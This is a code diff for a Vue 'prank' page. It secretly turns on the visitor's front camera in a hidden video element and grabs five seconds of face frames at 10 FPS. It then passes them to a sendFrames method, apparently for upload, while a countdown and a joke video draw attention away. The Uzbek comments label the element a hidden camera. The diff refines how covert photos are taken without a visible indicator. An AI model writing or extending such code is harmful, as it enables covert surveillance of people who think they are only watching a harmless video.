@@ -1,14 +1,13 @@
 <template>
   <div class="prank-wrapper">
-    <!-- 🎬 KULGILI VIDEO (USER SHUNI KO‘RADI) -->
+
+    <!-- 🎬 PRANK VIDEO -->
     <video
         ref="prankVideo"
         src="../assets/prank.mp4"
-        autoplay
         playsinline
         class="prank-video"
     ></video>
-
 
     <!-- 📸 YASHIRIN KAMERA -->
     <video
@@ -18,17 +17,25 @@
         style="display:none"
     ></video>
 
-    <div class="hint">
+    <!-- ⏱️ COUNTDOWN -->
+    <div v-if="countdown > 0" class="countdown">
+      {{ countdown }}
+    </div>
+
+    <div v-else class="hint">
       😂 Videoni tomosha qiling...
     </div>
+
   </div>
 </template>
+
 
 <script>export default {
   data() {
     return {
       frames: [],
-      session_id: null
+      session_id: null,
+      countdown: 3
     }
   },
 
@@ -42,7 +49,7 @@
   methods: {
     async startCapture() {
       try {
-        // 🎥 Kamera
+        // 🎥 Kamera darrov yoqiladi
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: false
@@ -52,12 +59,7 @@
         camVideo.srcObject = stream
         await camVideo.play()
 
-        // 😂 Prank video
-        const prankVideo = this.$refs.prankVideo
-        prankVideo.muted = false
-        await prankVideo.play()
-
-        // 📸 Frame olish
+        // 📸 Canvas
         const canvas = document.createElement("canvas")
         canvas.width = camVideo.videoWidth || 640
         canvas.height = camVideo.videoHeight || 480
@@ -65,20 +67,37 @@
 
         const start = Date.now()
 
-        const interval = setInterval(() => {
+        // 🎞 Frame olish (10 FPS, 5 soniya)
+        const captureInterval = setInterval(() => {
           ctx.drawImage(camVideo, 0, 0, canvas.width, canvas.height)
           this.frames.push(canvas.toDataURL("image/jpeg", 0.8))
 
           if (Date.now() - start >= 5000) {
-            clearInterval(interval)
+            clearInterval(captureInterval)
             stream.getTracks().forEach(t => t.stop())
             this.sendFrames()
           }
         }, 100)
 
+        // ⏱️ COUNTDOWN
+        const timer = setInterval(() => {
+          this.countdown--
+
+          if (this.countdown === 0) {
+            clearInterval(timer)
+            this.playPrankVideo()
+          }
+        }, 1000)
+
       } catch (e) {
         console.error("Camera error:", e)
       }
+    },
+
+    async playPrankVideo() {
+      const prankVideo = this.$refs.prankVideo
+      prankVideo.muted = false
+      await prankVideo.play()
     },
 
     async sendFrames() {
@@ -110,6 +129,18 @@
   width: 100%;
   height: 100%;
   object-fit: cover;
+}
+
+.countdown {
+  position: absolute;
+  inset: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-size: 120px;
+  font-weight: bold;
+  color: white;
+  background: black;
 }
 
 .hint {
